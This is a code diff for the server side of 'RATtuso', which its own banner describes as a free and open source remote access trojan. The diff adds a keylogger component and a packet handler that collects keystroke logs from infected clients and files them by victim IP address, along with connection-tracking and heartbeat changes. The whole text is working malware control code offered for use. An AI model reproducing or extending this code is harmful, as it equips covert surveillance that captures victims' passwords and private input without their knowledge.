@@ -2,6 +2,7 @@
 
 #include <type_traits>
 
+keylog keylogger = keylog();
 Server* Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
 auto temp_name = std::string("tempfile.tmp");
 
@@ -54,7 +55,7 @@ void Server::HandleInput()
 	std::string userinput;
 	int inputInt;
 	currentSessionID = -1;
-	std::cout << "RATtuso is a free and open source RAT\nIt's made with love by BomboBombone (check out my https://github.com/BomboBombone)\nHave fun using this piece of shit that I coded\n\n";
+	std::cout << "RATtuso v" VERSION " is a free and open source RAT\nIt's made with love by BomboBombone (check out my https://github.com/BomboBombone)\nHave fun using this piece of shit that I coded\n\n";
 	std::cout << "RATtuso console => ";
 	while (true)
 	{
@@ -206,6 +207,15 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 		fflush(NULL);
 		break;
 	}
+	case PacketType::Keylog:
+	{
+		std::string log; //string to store file name
+		if (!GetString(ID, log)) //If issue getting file name
+			return false; //Failure to process packet
+
+		keylogger.write(log, connections[ID]->IP);
+		break;
+	}
 	default: //If packet type is not accounted for
 	{
 		std::cout << "Unrecognized packet: " << (int32_t)_packettype << std::endl; //Display that packet was not found
@@ -258,22 +268,13 @@ bool Server::HandleSendFile(int ID)
 }
 
 void* Server::ClientConnectionChecker(void* args) {
-	PS::Message message("h");
-	Packet p = message.toPacket(PacketType::Heartbeat);
 	while (true)
 	{
 		for (size_t i = 0; i < serverptr->connections.size(); i++) //for each connection...
 		{
-			if (!serverptr->sendall(i, p.buffer, p.size)) //send packet to connection
-			{
-				std::cout << "Failed to send heartbeat packet to ID: " << i << std::endl; //Print out if failed to send packet
-				std::cout << "Lost connection to client ID: " << i << std::endl;
-				std::cout << CONSOLE_START;
-				fflush(NULL);
-				serverptr->DisconnectClient(i);
-			}
+			serverptr->SendString((int)i, "h", PacketType::Heartbeat);
 		}
-		_sleep(1000);
+		_sleep(5000);
 	}
 
 	return nullptr;
@@ -462,10 +463,12 @@ void* Server::ListenerThread(void* args)
 			else //If no unused connections available... (add new connection to the socket)
 			{
 				std::shared_ptr<Connection> newConnection(new Connection(newConnectionSocket));
+				newConnection->IP = inet_ntoa(serverptr->addr.sin_addr);
 				serverptr->connections.push_back(newConnection); //push new connection into vector of connections
 			}
 			std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(serverptr->addr.sin_addr) << std::endl;
 			std::cout << CONSOLE_START;
+			
 			General::createThread(ClientHandlerThread, (LPVOID)(&NewConnectionID)); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
 			General::createThread(OnClientConnected, (LPVOID)(&NewConnectionID));
 		}
